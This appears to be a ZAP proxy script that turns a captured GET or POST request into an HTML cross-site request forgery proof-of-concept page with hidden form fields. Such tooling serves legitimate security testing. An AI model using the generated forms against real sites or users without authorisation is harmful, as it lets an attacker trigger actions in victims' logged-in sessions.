// Generate simple PoC CSRF
// @author : Timothée Ruffenach
// Version 1.0

// Targeted scripts can only be invoked by you, the user, e.g. via a right-click option on the Sites or History tabs

/**
 * A function which will be invoked against a specific "targeted" message.
 *
 * @param msg - the HTTP message being acted upon. This is an HttpMessage object.
 */
function invokeWith(msg) {
	// create fianl result
	var result = ""
	result +=	"<html>\n";
	result += 	"  <body>\n";
	result +=	"    <script>history.pushState('', '', '"+"\/"+"')</script>\n" // change push path if needed

	// check POST of GET
	var methode = msg.getRequestHeader().getMethod()
	
	

	// search list.
	var body = msg.getRequestBody().toString(); // Get data body

	if(methode == "POST") 
	{
		result +=	"    <form action=\"" +msg.getRequestHeader().getURI().toString()+ "\" "+"method=\"" +methode+ "\">\n"
		// sereparate line with caractere &
		lines = body.split('&')

		for( line of lines)
		{
			
			indexEgal = line.indexOf('=');
			if(indexEgal !== -1)
			{
				key = line.substring(0, indexEgal);
				value = line.substring(indexEgal + 1);
				result += "        <input type=\"hidden\" name=\"" +key+"\" value=\"" +value+ "\"/>\n"
			}
		}
		result += "        <input type=\"submit\" value=\"Submit request\"/>\n"
	}
	else if(methode == "GET")
	{
		result +=	"    <form action=\"" +msg.getRequestHeader().getURI().toString()+ "\">\n"
		
		uri=msg.getRequestHeader().getURI().toString()
		data = uri.split('?')
		data = data[1]
		
		lines = data.split('&')

		for( line of lines)
		{
			
			indexEgal = line.indexOf('=');
			if(indexEgal !== -1)
			{
				key = line.substring(0, indexEgal);
				value = line.substring(indexEgal + 1);
				result += "        <input type=\"hidden\" name=\"" +key+"\" value=\"" +value+ "\"/>\n"
			}
		}
		result += "        <input type=\"submit\" value=\"Submit request\"/>\n"
	}
	// close tag
	result +=	"    </form>\n"
	result +=	"  </body>\n"
	result +=	"</html>\n"
	print(result)
}
